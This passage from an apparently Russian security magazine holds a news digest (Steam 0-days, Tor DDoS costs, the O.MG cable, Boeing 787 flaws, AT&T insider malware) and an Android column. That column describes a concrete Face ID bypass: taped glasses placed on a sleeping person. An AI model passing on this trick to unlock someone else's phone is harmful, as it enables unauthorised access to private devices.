   посетителей сайтов) приносит куда меньше прибыли, чем обычная реклама.

   Исследователи подсчитали, что размещение на сайте 3 рекламных объявлений приносит в 5,5
   раза больше прибыли, чем встраивание в страницы ресурса скрип тов для крип тоджекин га. Что‐
   бы обеспечить сравнимый уровень дохода, владельцу сайта необходимо удерживать посети‐
   телей более 5,53 минуты, а это непросто.

   Также исследователи отмечают, что занимающиеся криптоджекин гом сайты не только увеличи‐
   вают нагрузку на процессор, но и используют в 1,7 раза больше оперативной памяти, нежели
   ресурсы с обычной рекламой.





 VALVE
 И ДВА ЗЕРОДЕЯ
  Первый 0-day
  В начале августа ИБ‐специалист Василий Кра вец в открытом доступе опуб‐
  ликовал информацию об уяз вимости, которая позволяла добиться локаль‐
  ного повышения привилегий в клиенте Steam, пос ле чего любой поль‐
  зователь  получает  воз можность  выполнять  команды  от  имени  NT
  AUTHORITY\SYSTEM. Уяз вимость была проверена в Windows 8 x64, Windows
   8.1 x64 и Windows 10 x64.
    Проблема заключалась в том, что на момент публикации отчета спе‐
  циалиста баг все еще не был исправлен, хотя Кра вец честно сообщил Valve
  об уязвимости через платформу HackerOne и выждал 45 дней после принятия
   отчета о проблеме.
     Оказалось, сначала исследова телю пришлось доказы вать персоналу
  HackerOne, что у него действительно есть отчет об уязвимос ти, так как Valve
  использует функцию Managed by HackerOne, то есть информацию о проб‐
  лемах сначала проверяют специалисты плат формы. Уже на этом этапе Кра‐
  вец получил первый отказ из‐за того, что предложенная им атака якобы тре‐
  бовала возможности рас полагать файлы в произволь ных путях файловой сис‐
  темы.
     Так как на самом деле ни одной операции с файловой системой спе‐
  циалист не предлагал, он добился перепроверки отчета и его все же переда‐
  ли инженерам Valve. Одна ко вскоре отчет вновь пометили как неприемлемый,
   так как «атака требует физичес кого дос тупа к устройству пользовате ля».
  Исследователь с сожалением отмечал, что атаки на повышение привилегий,
  очевидно, попросту неинтересны Valve. Хуже того, спе циалисту запретили
  публиковать информацию о проблеме, даже учи тывая, что Valve не собира‐
  лась ее исправлять.



        «Довольно иронич но обна ружить, что лаунчер, который фак тичес ки
        пред назна чен  для  того,  чтобы  запус кать  сторонние  программы
         на вашем компьюте ре, поз воляет им втихую получить мак симальные
        привиле гии», — писал Кра вец.

  После публичного раскрытия данных об уязвимости, а также о тщетных попыт‐
   ках добиться ее исправления, Valve и HackerOne подверглись рез кой критике
  со стороны сообщества. В ответ на этот негатив Valve все‐таки выпустила
  исправление, воздерживаясь от комментариев, но уже через несколько часов
  специалисты заметили, что патч компании неэффективен и его можно легко
  обойти.
     Хуже того, когда СМИ привлекли внимание к происходящему, выяснилось,
   что известный ИБ‐эксперт Мэтт Нельсон (Matt Nelson) тоже обнаруживал дан‐
  ную уязвимость и тоже пытался сообщить о ней компании через HackerOne.
  Однако и в этом случае Valve отказалась исправлять проблему, а затем отчет
  эксперта вообще был заблокирован, когда Нельсон хотел публично раскрыть
  ошибку и пре дупредить пользователей.





  Вто рой 0-day
  Затем Василий Кравец опубликовал подробный отчет о второй 0‐day‐уяз‐
  вимости в клиенте Steam, также свя занной с локальной эскалацией привиле‐
   гий. Более того, иссле дова тель расска зал, что не имеет возможности сооб‐
  щить о проблеме Valve, так как пос ле поднявшейся шумихи и публикации пер‐
  вого  отчета  его  попросту  забанили  в  bug  bounty  программе  Valve
  на HackerOne.





  Вместе с этим ИБ‐сообщество продолжало кри тиковать Valve, так как проб‐
  лемы эскалации привилегий никак нельзя наз вать пус тяковыми. Разумеется,
   такие уязвимости не используются для первичного взлома компьютера и уда‐
  ленных приложе ний, но они полезны во время пос тэксплуатации и помогают
  злоумышленникам установить полный контроль над целью, получив права
   root/admin/system.
     Отказавшись исправлять данные проб лемы, Valve фактически подвергла
  опасности около 100 миллионов Windows‐пользователей, которые имеют
  на своих компьютерах установленный клиент Steam.


  Патчи и изме нения в bug bounty
  В итоге 22 августа 2019 года компания Valve наконец отреаги ровала на про‐
  исходящее должным обра зом.
     Во‐первых,  Valve добавила исправления для описанных уязвимос тей
   в бета‐версию клиента Steam, и пока сообщений об обходе этих патчей
   от исследователей не пос тупало.
     Во‐вторых, представители компании Valve прервали свое затянувшееся
  молчание и в комментарии изданию ZDNet назвали все произошедшее
  огромным недоразумением:



        «Пра вила нашей программы HackerOne должны были лишь отсе ивать
         отче ты, которые пред лагали проинс трук тировать Steam на  запуск
        ранее уста нов ленного вре донос ного ПО на компьюте ре пользовате ля
         от име ни этого локального пользовате ля. Но вмес то этого неп равиль-
        ное толкование пра вил привело к отсе ива нию более серьезной ата ки,
         которая пред полагала выполнение локального повыше ния привиле гий
         через Steam. Мы обновили пра вила нашей программы на HackerOne,
         чтобы прямо ука зать, что такие проблемы рас сматрива ются и о них
         сле дует сообщать».

  Правила bug bounty программы компании дей ствительно уже были обновле‐
  ны соответствующим обра зом. Кроме того, в компании назвали ошибкой
   отклонение первого отчета Кра веца, пообещали рас смотреть сложившуюся
   ситуацию еще раз и затем решить, как пос тупить дальше. Пока иссле дова‐
   тель по‐прежнему забанен Valve в H1.


 КОЛИЧЕСТВО АТАК НА МОБИЛЬНЫЙ БАНКИНГ ВОЗ РОСЛО
 В ДВА РАЗА
   Исследователи компании Check Point представили отчет, пос вященный основным тенденциям
   в кибератаках в первом полугодии 2019 года. Резко вырос ла доля атак на мобильный банкинг
   и облачные хранилища, а одной из самых распространенных угроз стала банковская малварь.
   Эксперты подчеркивают, что в наши дни ни одна сфера пол ностью не защище на от кибератак:
   опасности подвержены личные мобильные устройства, облачные хранилища, мобильный бан‐
   кинг, электронная почта, различные приложения и даже популяр ные почтовые платформы.





   По данным ком пании, количество атак на мобильный банкинг воз росло в два раза. Также
   киберпреступники активно используют атаки на цепоч ки пос тавок, а растущая популяр‐
   ность общедоступных облачных сред привела к увеличению числа кибератак, нацеленных
   на огромные объемы конфиден циальных данных, находящихся на этих платформах.

   Наиболее серьезные угрозы для безопасности облаков в 2019 году — неправиль ная кон-
  фигурация и плохое управление облачными ресурсами.
   Среди вредоносов, наиболее активных в первом полуго дии, по‐прежнему лидирует майнин‐
   говая малварь.





  В России, в свою очередь, был очень активен вредонос по имени «Агент Смит». Под видом
   скрытого приложения, связан ного с Google, вредонос ная прог рамма использует известные
   уязвимости Android и автоматически заменяет установленные легитимные приложения вре‐
   доносными версиями незаметно для пользовате ля. Пользователи  загружали при ложе ние
   из популярного неофициального магазина приложений 9Apps. «Агент Смит» заразил в России
   около 57 000 устройств.





 ДЕГРАДАЦИЯ TOR.
 БЫСТРО, НЕДОРОГО
  Эксперты из Джорджтаунского университета и Исследовательской лабора‐
  тории ВМФ США представили на конференции USENIX интересный доклад,
  посвященный деградации производитель ности сети Tor.
    Иссле дователи утверждают, что ощутимо повредить работоспособности
   Tor можно простыми DDoS‐атаками на TorFlow, мосты Tor и конкретные узлы.
  Хуже того, такие атаки могут стоить тысячи или десятки тысяч дол ларов, что
  просто смехотворно,  если  речь  идет  о  «пра вительственных  хакерах»
  или серьезных киберпрес тупных группах.
     Конечно, атака на всю сеть Tor полностью — это утопическая идея. Если
  говорить   о   DDoS,   ата кующим   понадобится   набрать  мощность
   как минимум 512,73 Гбит/с, и это будет стоить примерно 7,2 миллиона дол‐
  ларов в месяц. Однако, по подсчетам исследова телей, такие радикальные
  меры вовсе не обязатель ны.
    Вместо этого специалисты предложили ата ковать мосты Tor — специаль‐
  ные входные узлы, списка IP‐адресов которых нет в откры том доступе
  и которые поэтому нельзя легко заблокировать. Так, в Tor‐браузере есть спи‐
  сок предустанов ленных мос тов, а также нас тройки можно найти на bridges.‐
   torproject.org. Мосты поз воляют обходить цензуру в странах, где власти
   активно борются с использованием Tor.
    Иссле дователи пишут, что в настоящее время далеко не все мосты Tor
   находятся в рабочем состоянии (по их информа ции, работают лишь две над‐
   цать) и DDoS‐атака на них обойдется лишь в 17 тысяч дол ларов в месяц.
  И даже если зарабо тают все 38 мос тов, то ата ка на них будет стоить
  лишь 31 тысячу дол ларов в месяц.
    Еще один возможный сценарий атаки — DDoS, направленная на TorFlow,
  систему балансировки нагрузки в сети Tor. Эта сис тема рас пределяет тра‐
   фик, чтобы предотвратить переполнение и замедление работы некоторых
  серверов.
    По подсче там аналитиков, продолжительная DDoS‐атака на  TorFlow,
  использующая общедоступные DDoS‐сервисы, будет стоить все го 2800 дол‐
  ларов в месяц. При этом, говорится в докладе, высокоточная симуля ция
  показала, что подобная атака снизит среднюю скорость загрузки клиента
  на 80%.
     Третий предложенный исследова телями сценарий атак — это атаки
  на наиболее распространенный тип Tor‐серверов — конкретные Tor‐узлы (re‐
    lay). В данном случае предполагается не применять DDoS‐атаки, а исполь‐
   зовать проблемы самого Tor, то есть логические ошибки для замедления
  работы и времени загрузки контента. Подобные проблемы много лет экс плу‐
   атируются злоумышленниками и конкурирующими хак‐группами, и разработ‐
   чики Tor по мере сил бо рются с такими багами.
     Как подсчитали эксперты, атаки на конкретные .onion‐ресурсы тоже стоят
  совсем недорого. Так, злоумышленник может увеличить среднее время заг‐
   рузки трафика на конкретном сайте на 120% всего за 6300 долларов в месяц
  или на 47% всего за 1600 долларов в месяц.



         «Как извес тно, государс тва спонсиру ют DoS-ата ки, а прос тота при-
        мене ния и низ кая стоимость наших атак поз воляют предположить, что
         влас ти могут использовать их для под рыва работы Tor как в крат-
         косроч ной, так и в долгосроч ной пер спек тиве. Мы полагаем, что
         государс тва могут, нап ример, выбрать DoS в качес тве альтер нативы
        фильтра ции тра фика, пос кольку Tor пос тоянно продолжает улуч шать
        свою способность обхода блокировок и цензуры», — пишут иссле-
        дова тели.


 23% ПОЛЬЗОВАТЕЛЕЙ НЕ ЗАЩИЩАЮТ СВОИ ЛИЧНЫЕ
  ДАННЫЕ
   Компания ESET провела опрос о безопасном поведении в интернете. Согласно иссле дованию,

  23% пользователей не предпринимают вообще ничего для защиты своих персональных дан‐
   ных;

  17% опрошенных удаляют историю поисковых зап росов;

  15% признались, что заклеивают веб‐камеру, чтобы злоумышленники не могли за ними под‐
   глядывать;

  14% пользователей не вводят данные от кредитных карточек даже на официальных сайтах;

  11% регулярно очищают сообщения в переписке.

   Также выяснилось, что некоторых поль зователей навязчивая реклама вол нует не меньше
   безопасности, поэтому они указывают времен ные email при регистрации, чтобы не получать
   спам. Таких насчитыва ется 13%.





 НОМЕР NULL —
 ПЛОХАЯ ИДЕЯ
  Как известно, в США пра вила допус кают исполь зование персонализирован‐
  ных номерных знаков для авто мобилей (хотя и с некоторыми ограничениями).
  Однако история, которой поделился на конференции DEF CON ИБ‐иссле‐
  дователь,  известный под  псевдонимом  Droogie, выс тупая  с  докладом
  об экранировании входных данных, доказывает, что проявлять излишнее
  творчество и юмор в таких делах все же не стоит.





                                  Droogie на DEF CON

  Шутки ради Droogie зарегистрировал в Калифорнии номерной знак, сос‐
  тоящий исключительно из сло ва NULL. Исследова тель признался аудитории,
   что изначально просто хотел пошутить, а также в глубине души надеялся, что
   этот трюк поможет ввести в заб луждение автоматические считыватели
  номерных знаков и систему выдачи штрафов Минис терс тва транспорта США
   (DMV), сделав его настоящим невидимкой. Но в реальности все вышло сов‐
  сем наоборот.
    В течение первого года  Droogie,  как  аккуратный водитель, вообще
  не получал никаких штрафов и казалось, что все в порядке. Первый тревож‐
  ный звоночек прозвенел, когда исследова тель решил перерегистрировать
  свои номера через интернет: на сайте ему предложили ввести свой номер‐
  ной знак, но после вво да NULL страница DMV сломалась и отказалась рас‐
  познать ввод.
     Затем Droogie получил штраф за неправильную парковку и понял, что стать
  невидимкой ему не удалось. Хуже того, ока залось, что после этого база дан‐
  ных неоплаченных штрафов связала номерной знак NULL с его адресом, и на
  исследователя посыпались сотни чужих штра фов. Дело в том, что база нап‐
  равляла на адрес исследователя все штрафы для случаев, когда номера
   автомобилей‐нарушителей были ей неизвестны. Вскоре общая стоимость
  штрафов, полученных Droogie, сос тавила 12 049 долларов.


                                        Продолжение статьи →
← Начало статьи





  Когда  исследователь  свя зался  с  предста вителями DMV  и  полицией
  Лос‐Анджелеса, объяснив им, что про исходит, те лишь развели руками
  и посоветовали ему поменять номера.
    И хотя чужие штрафы на сумму 12 тысяч долларов с Droogie сняли, ком‐
   пания, управляющая базой данных, по‐прежнему не решила проблему
  и чужие штрафы продол жают поступать специалисту до сих пор. В настоящее
  время система считает, что Droogie должен опла тить штрафов примерно
  на 6000 долларов, но исследова тель сооб щил под смех аудитории, что опла‐
   чивать их он не намерен.


 НОВАЯ ТЕХНИКА DDOS‐АТАК
   Эксперты Qrator Labs отра зили нап равлен ные на международную хостинго вую платформу
   Servers.com DDoS‐атаки, длившиеся с 18 по 20 августа 2019 года. В их чис ле была первая
   в мире зафиксированная на практике широко масштабная атака с использованием одного
   из векторов TCP‐ампли фикации (реплицированный SYN/ACK‐флуд).





  →«Произошедший инцидент — отличная демонс трация того, насколько хрупким является сов‐
   ременный интернет. Прошло почти пять лет с тех пор, как был опубликован иссле довательский
   документ, описывающий технику SYN/ACK‐амплификации. Тем не менее за это вре мя не было
   предпринято никаких инженерных усилий для решения проблемы, что в ито ге привело к серии
   успешных атак с абсолютно разрушительными пос ледствиями.
      Сегодня нам нужны более совершенные протоко лы, инфраструктура и технологии для пре‐
   дотвращения подобных атак в ближайшем будущем. Необходимо построение системы управле‐
   ния угрозами, составление планов по снижению рис ков и их корректировка не реже одного
   раза в год, поскольку в наши дни ситуация с угрозами безопасности меняется очень быс тро»
  — Александр Лямин, основатель и генеральный директор Qrator Labs





 ВРЕДОНОСНЫЙ
 КАБЕЛЬ
  Энтузиаст под псевдонимом MG давно и хорошо известен в ИБ‐сообществе.
   Так, при создании вредонос ного кабеля USBHarpoon именно его работами
  вдохновлялись такие легенды, как Кевин Митник. Дело в том, что MG не раз
  демонстрировал в своем Twitter атаки через рукотворные вредоносные USB‐
  кабели и даже несостоятельность специальных переходников (такие решения
  известны, как USB‐презервативы или USB condom), которые призваны
  защищать от атак через USB.
     Свое новое тво рение — вредоносный кабель под наз ванием O.MG cable,
  разработанное при поддержке еще нес кольких талантливых инженеров, MG
  впервые продемонстрировал еще в начале текущего года. Такой кабель
  внешне не отличается от обычного, и его мож но подключить к машине
  под управлением Linux, Mac или Windows.
    Однако на деле O.MG cable совсем не так прост: он определяется сис‐
  темой как HID (Human Interface Device), то есть USB‐девайс для взаимодей‐
   ствия с человеком (обычно это клавиатура, мышь, игровой контроллер
  и подобное). Так как MG добавил своей разработке и поддержку беспровод‐
  ных соединений, в ито ге, благода ря подключению O.MG cable к целевой
  машине, злоумышленник получает воз можность выполнять через Wi‐Fi любые
  команды, будто просто набирает их на клавиатуре целевого компьютера.
    На этот раз MG пошел дальше демонс трации прототипа в Twitter и привез
  вредоносные кабели на ИБ‐конференцию DEF CON, где их можно было при‐
  обрести по цене 200 долларов США за штуку. O.MG cable поставляется с уже
  готовыми пейлоадами, и его оператор даже имеет возможность удаленно
   «убить» USB‐имплантат, заметая следы.
    В настоящее время (при пря мом подключении к кабелю) атакующий может
  находиться в радиусе примерно 90 м от своей цели, но MG подчеркивает, что
  кабель также можно нас троить для работы в качестве клиента в ближай шей
  беспроводной сети. И если эта беспроводная сеть име ет выход в интернет,
  расстояние атаки уже ничем не огра ничено.
    Иссле дователь рассказал, что переделывать оригинальные кабели Apple
   вручную оказалось непростой задачей, но, если делать кабели с нуля и в
  большем масштабе, эта проб лема отпа дет сама собой (пока на сборку одно‐
   го кабеля MG тратит около четырех часов).
    Дело в том, что домашний проект O.MG cable вот‐вот перерастет в пол‐
  ноценное производство,  так  как с MG уже  сог ласилась  сотрудни чать
  Hak5 и производство O.MG cable планируют пос тавить на поток, продавая
  устройства как легитимный инс трумент для пентестеров и ИБ‐спе циалис тов.
     Согласно блогу MG, стоимость серийных O.MG cable дол жна составить
  около 100 долларов США. Точных дат начала продаж MG пока не называет,
  но на сайте Hak5 уже появилась специальная страница, где можно зарегис‐
  трироваться и получить уведомление, когда кабели будут готовы.


  ДВУХ ФАКТОРНАЯ АУТЕНТИФИКАЦИЯ ЗАЩИТИТ ОТ 99,9%
 ПОПЫТОК ВЗЛОМА

   По статистике компании Microsoft, многофакторная аутен тификация позволяет блокиро вать
  99,9% автоматизированных атак, причем речь идет не только об учетных записях Microsoft,
   но и о любых других профилях, на любых веб‐сайтах или онлайн‐сервисах.

   Блог компании сообщает, что каждый день совер шается более 300 000 000 попыток мошен‐
   нического входа в облачные сервисы Microsoft и включение многофак торной аутентификации
   помогает блокировать большинс тво, даже если в рас поряжении хакеров есть копия текущего
   пароля пользователя.

   Оставшиеся 0,1% при ходятся на более сложные атаки, связанные с захватом токенов мно‐
   гофакторной аутентификации, но подобные атаки пока редки по срав нению с credential stufﬁng
   атаками ботнетов.





 ПРОБЛЕМЫ В КОДЕ
 BOEING 787
  Специалист компании IOActive Рубен Сантамарта (Ruben Santamarta) пред‐
   ставил на конференции Black Hat крайне интересный доклад. Иссле дователь
  рассказал, что в сентябре прошлого года ему случайно удалось обнаружить
   в Сети исходные коды Boeing 787 Dreamliner. Впоследствии было под‐
  тверждено, что эти work in progress коды были слу чайно оставле ны на обще‐
  доступном сервере Boeing, принадлежащем RnD‐подразделению компании.
     Изучив исходники, исследователь выявил в них ряд уязвимос тей и пришел
   к выводу, что благода ря этим багам теоретически воз можен даже угон
  самолета.
     Сантамарта объясня ет, что на борту Boeing 787, по сути, присутствуют три
   электронные сети: первая, в которой работа ют разные некритичные системы,
   такие как бортовая развлекательная система; вторая, более изолированная,
   где базируются более важные приложения, зарезервированная для экипажа
  и технического обслуживания; и третья, самая защищенная, отведенная
  для работы авионики (совокупность всех систем, раз работанных для исполь‐
  зования в авиации в качес тве бортовых приборов).
    На  общедоступном  сервере  Boeing  эксперту  удалось  обнаружить
  исходники, относящиеся ко второй сети: прошивки Crew Information System /
  Maintenance System (CIS/MS), а также Onboard Networking System (ONS)
  для Boeing 787 и 737.
    Проведя анализ исходников, а  также изу чив най денные в откры тых
  источниках документы, Сантамарта выявил в коде ряд проблем. К примеру,
   в своем докладе исследова тель предлага ет исполь зовать баги в бортовой
  развлекательной системе в первой сети, чтобы проникнуть во вторую сеть
  и там эксплуатировать уязвимос ти в CIS/MS, в итоге попав в третью сеть, где
  будет возможно подключиться к авионике, повлиять на показания приборов
  и даже угнать воздушное судно.
    В изученном коде сотрудникам IOActive уда лось выявить сотни ссылок
  на небезопасные вызовы функций в кас томных час тях имплементации ядра
  VxWorks CIS. Также были обнаружены проблемы, связанные с целочисленны‐
  ми переполнениями, переполнением буфера, отказом в обслуживании, out‐
   of‐bound чтением и записью, нарушением целостнос ти информации в памяти
  и так далее.
    При этом эксперт подчеркивает, что поработать с настоящим Boeing 787
  «вживую» ему не удалось, то есть все тес ты про водились на несертифици‐
  рованной платформе, и Сантамарта не смог доподлинно убедиться, действи‐
   тельно ли бы он сумел эксплуатировать найденные уяз вимос ти и с их
  помощью контро лировать системы управления полетом.
     Представите ли IOActive свя зались с инженерами компаний Boeing и Hon‐
   eywell (разработчик CIS/MS), и те подтвердили наличие проблем в коде Boe‐
   ing 787. Однако вместе с этим разработчики сообщили, что им не удалось
  воспроизвести описанные исследователем ата ки на практике и захватить
  контроль над авионикой, а зна чит, системы воздушных судов нельзя считать
   уязвимыми. Кроме того, в Boeing уверяют, что компания уже пред приняла
  защитные меры, которые дополнительно меша ют эксплуатации багов. Под‐
  твердить или опровергнуть это заявление в IOActive не смогли.
     Представите ли Boeing рассказали британскому изданию The Register, что
  они «разочарованы безответственной и вводящей в заблужде ние пре зен‐
  тацией IOActive». По словам представителей компании, исследователи IOAc‐
    tive изучили лишь одну часть сети Boeing 787, исполь зуя для этого «рудимен‐
  тарные инструменты», не имея дос тупа к дру гим системам и фактической
  рабочей среде. Но исследова тели решили проигно рировать эти ограничения
  и подтвержденные результаты тес тов, проведенные специалис тами самой
   Boeing, и теперь выступают с «провока ционными заявлениями, будто у них
  был доступ и они анализировали работа ющую сис тему».


 ПОКОНЧИТЬ С WINDOWS 7 БУДЕТ НЕПРОСТО
   Эксперты «Лаборатории Касперского» пре дупредили, что не только прос тые пользователи, но и
   малый и средний бизнес по‐прежнему активно используют Windows 7 и ско рое прекращение
   поддержки вряд ли быстро это изменит.

   Расширенная поддержка Windows 7 будет прекращена 14 января 2020 года. Microsoft про‐
   должит предоставлять обновления безопасности некоторым пользователям и после этой даты,
   вплоть до января 2023 года, но придется платить за каждое устройство отдельно, и цена
   будет возрастать каждый год.





   По данным исследова телей, 47% представите лей малого и среднего бизнеса по‐прежнему
   полагаются на Windows 7, тогда как среди домаш них пользователей это значение равно 38%.

   Интересно, что Windows 10 тоже используют 47% организаций, то есть в случае малого
   и среднего бизнеса наблюдается паритет.


   К счастью, уже практически никто не пользуется Windows XP, Vista и Windows 8 (количес тво
   домашних и корпоративных поль зователей не превышает 1–2% от общего чис ла).

  Однако Windows 8.1 все еще может похвастаться 7% домашних установок и в 5% слу чаев при‐
   меняется на предприятиях.

  →«Широкое распространение Windows 7 вызывает бес покойство, так как до окончания под‐
   держки осталось менее шести месяцев. Причины такого отставания в обновле нии ОС могут
   быть разными, начиная от установленного прог рам много обес печения, которое может быть
   не в состоянии работать с новейшими вер сиями ОС, и закан чивая экономическими причинами
   или простым удобством от использования привычной ОС», — говорит специалист «Лаборатории
   Касперского» Алексей Панкратов.





 ВЗЯТКА ЗА МАЛВАРЬ
  Министерство юстиции США сообщило, что сотрудни ки компании AT&T
  получили более миллиона долларов взяток за внедрение вредоносного ПО и
  несанкционированного обо рудования в сети компании, а также разблокиров‐
   ку двух миллионов мобильных устройств.
     Следствию стало извес тно о происходящем во время раз бирательства
  по делу 34‐летнего гражданина Пакистана Мухаммеда Фахда (Muhammad
   Fahd) и его сообщника Гулама Дживани (Ghulam Jiwani), который в настоящее
  время считается умершим. Именно этих дво их обвиняют в подкупе сотрудни‐
   ков AT&T в вашингтонском кол‐центре Mobility Customer Care.
     Фахд был арестован в Гонконге в феврале 2018 года и экстрадирован
   в США в июле 2019 года. Сейчас ему предъ явлен целый ряд обвинений,
   из‐за чего ему грозит тюремное заключение на срок до двадцати лет.
    Сообщается,  что  злоумышленники подкупали  сотрудников компании
  с апреля 2012 года по сентябрь 2017‐го. Начинали Фахд и Дживани с малого:
  со взяток за разблокировку дорогих iPhone, чтобы устрой ства можно было
  использовать за пределами сети AT&T.
    Мошенники связывались с сот рудниками компании через социальные
  сети или по телефо ну, и, если те «за скромное вознаграждение» соглашались
  разблокировать устройства, им передавали списки кодов IMEI. После этого
   взятки переводились на банковские счета сотрудников, созданные под прик‐
  рытием подставных компаний, или же пакистанцы попросту передавали
  инсайдерам наличные. Хуже того, кому‐то платили за то, чтобы помочь опре‐
  делить других сотрудников, которых можно подкупить и убе дить присоеди‐
   ниться к мошеннической схеме.
     Этот первоначальный этап длился примерно год, до апреля 2013 года, и в
  результате несколько сот рудников AT&T были уволены или сами покинули
  компанию.
     Затем Фахд изменил тактику, и работников AT&T стали подкупать ради
   установки малвари в сети компании  (в упомянутом кол‐центре в штате
  Вашингтон). Согласно судебным документам, изначально вредонос ная прог‐
  рамма собирала данные о том, как работа ет инфраструктура AT&T. Судя
  по описанию, это был кейлоггер, способный собирать конфиденциальную
  и  закрытую информацию о  структуре и функциони ровании  внутренних
  защищенных систем и приложений ком пании.
    По данным Минюста, пос ле этого пакистанские злоумышленники создали
   вторую версию малвари, которая использовала информацию, собранную
  первым вредоносом. Так, эта малварь исполь зовала похищенные учетные
  данные сотрудников AT&T для выполнения автоматических действий с внут‐
  ренним приложением компании. Теперь мошенники могли раз блокировать
  телефоны автоматически, и необходимость каждый раз взаимодей ствовать
  с сотрудниками и подкупать их отпала.
    В 2014 году у Фахда начались проблемы с управлением этой вредоносной
   «закладкой», и он был вынуж ден подкупить сотрудни ков кол‐центра еще раз,
  теперь для установки в сети компании ряда точек беспроводного доступа.
  Через эти девайсы злоумышленники вновь получи ли доступ к внутренним
  приложениям и сети AT&T, продолжив мас сово разблокировать телефоны.
    По информации следствия, в общей сложности Фахд и Дживани потратили
  на взятки более миллиона долларов США и успешно отвязали от сети AT&T
  свыше двух миллионов устройств (в основном это были дорогие iPhone). Так,
  за пять лет только один из сотрудников AT&T получил взяток на сумму
  более 428 500 дол ларов США. Трое неназ ванных соучастников этой схемы
  уже признали свою вину.
     Известно, что Фахд и Дживани управляли сразу тремя компани ями: End‐
   less Trading FZE, Endless Connections Inc. и iDevelopment. При этом Минюст
  не уточняет, занимались обвиняемые раз блокировкой украденных устройств
  или просто запустили сайт, где предлагали услуги по раз блокировке мобиль‐
  ных устройств. Потери AT&T от действий мошенников оцениваются приб‐
  лизительно в пять миллионов долларов в год.
     Представите ли AT&T уже заявили, что сотрудничали с правоохранитель‐
  ными органами, расследовавшими данную мошенническую схему, и подчер‐
   кнули, что личные данные клиентов от дей ствий Фахда и Дживани не постра‐
   дали.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Эксперты Google обнаружили сайты, годами атаковавшие пользователей iOS


   Малварь TrickBot теперь ворует PIN‐коды и учетные данные от аккаунтов Verizon, T‐Mobile
   и Sprint


   Специалисты Avast и француз ская полиция обезвредили ботнет, насчитывавший 850 тысяч
   машин


   После раскрытия уяз вимостей на Black Hat начались атаки на VPN‐решения Fortigate и Pulse
   Secure


   Исследователи предуп редили, что протокол WS‐Discovery исполь зуется для DDoS‐атак


   Представлен ключ YubiKey 5Ci, совместимый как с USB‐C, так и с Lightning


   Две новые уязвимости с потенциалом чер вя угрожают Windows и похожи на BlueKeep


  В коде Webmin более года скрывался бэкдор


   Из‐за ошибки продук ты «Лаборатории Касперско го» позволяли сайтам шпионить за поль‐
   зователями


   Только 26% пользователей сог ласились сменить пароль, узнав о его компрометации
HEADER
 ANDROID





    ОБМАН FACE ID, СРАВНЕНИЕ JAVA
    И KOTLIN И РАЗБОР ПАТТЕРНОВ
            MVC, MVI, MVVM




Сегодня в выпус ке: простой и эффектив ный
способ  обмана  Face  ID,  реверс‐инжи‐
ниринг прошивок IoT‐устройств, неожидан‐
ные результаты сравнения про изво дитель‐
ности Java и Kotlin, сравнение паттернов          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
MVC, MVP, MVVM и MVI, советы по исполь‐              zobnin@glc.ru
зованию Android Studio. А также: набор све‐
жих инструментов пентестера и библиотек
для программис тов.


                ПОЧИТАТЬ


Как обмануть Face ID
Biometric Authentication Under Threat: Liveness Detection Hacking — презен‐
тация с Black Hat, посвящен ная способам обмана биометрических сенсоров
в смартфонах (датчик отпечатка пальца, ска нер лица и сетчатки). Авторы при‐
водят несколько способов обхода датчиков, в том числе с помощью прямого
подклю чения к шине камеры и подачи на нее заранее сня того изображения
(это позволяет обой ти  алго ритмы определения реального присутс твия
человека, но не лазерные сканеры в iPhone и некоторых дру гих смартфонах).
Но интереснее всего способ обмана сканера Face ID в iPhone X и более поз‐
дних моделях.
  Во время  сканирования  iPhone строит подробную 3D‐модель лица
человека и требует, чтобы глаза были откры ты. Такой подход сводит на нет
почти все методы манипуляции, включая показ фотографии, видеозаписи,
поднесение смартфона к лицу спящего человека и так далее.
  Но у этого механизма есть фундаментальный изъ ян. При сканировании
лица челове ка в очках он не может полагать ся на 3D‐сканирование глаз
и переключается на куда более простой алгоритм: если в районе глаз есть
белая точка на черном фоне — гла за счи таются открытыми. Достаточно взять
любые очки, наклеить на них два кусочка черной изо ленты, нарисовать в их
центре белые кружки, и вуаля: надева ем очки на спя щего человека, подносим
к его лицу смартфон — и экран разблокирован.





                    Очки для обмана Face ID


Ре верс‑инжиниринг про шивок IoT-устройств
How  to  Start  IoT  device  Firmware  Reverse  Engineering? —  вве дение
в реверс‐инжиниринг прошивок раз личных IoT‐устрой ств, таких как роутеры,
камеры, устройства для умного дома и так далее. Статья короткая, простая,
но содержит несколь ко вводных рекомендаций, которые могут пригодиться
новичкам.
 1. Лю бой реверс начинается с поиска самой про шивки. Обычно ее можно
   скачать с сайта производителя или на форумах.
 2. Зачастую прошивки распростра няются в zip‐архиве, внутри которого
   находится файл с расширением .bin.
 3. Обычно файл .bin — это сплав из загрузчи ка, ядра Linux и образов одного
   или нескольких разделов. Что бы узнать адреса смещений, по которым
   находятся эти образы в файле, можно использовать утилиту binwalk:


   $ binwalk ‐e TL‐WR841Nv14_EU_0.9.1_4.16_up_boot[180319‐rel57291].
   bin





 4. Адрес смещения можно использовать, чтобы извлечь образ раз дела
   с помощью утилиты dd (в данном случае образ корневой файловой сис‐
  темы squashfs):


   $ dd if= TL‐WR841Nv14_EU_0.9.1_4.16_up_boot[180319‐rel57291].bin
   skip=1049088 bs=1 of=TP.sfs

 5. Получить содержимое файловой системы squashfs позволя ет утилита un‐
   squashfs:


   $ unsquashfs TP.sfs

 6. На этом все, можно начинать анализ содержимого прошивки.


              РАЗРАБОТЧИКУ


Сравнение про изво дительности Java и Kotlin
Java vs. Kotlin — Part 1: Performance — сравнение производительнос ти Java
и Kotlin с помощью набора бенчмарков Computer Language Benchmark Game
(CLBG), используемого во многих исследователь ских работах.
   Автор взял шесть бен чмарков CLBG на Java, сконвертировал их в Kotlin
с помощью встроенного в Android Studio конвертера, а затем перепи сал их
в  соответствии  с  особенностя ми  Kotlin  и  рекомендациями  JetBrains
по написанию кода. Затем сравнил произво дительность и потребление
памяти всех трех версий кода на стандартной виртуальной машине Java
HotSpot.





                      Результаты бенчмарка

Результаты получились интерес ные. Почти во всех тестах выиграла Java,
и лишь в двух впереди ока зался Kotlin, но не вручную написанный код, а скон‐
вертированный из Java. Так получилось потому, что разработчики  Kotlin
рекомендуют исполь зовать синтаксичес кий сахар и функциональное прог‐
раммирование, которые существенно упро щают написание кода, но создают
дополнительный оверхед.
  Заметно также, что Kotlin значитель но проиграл по потреблению памяти
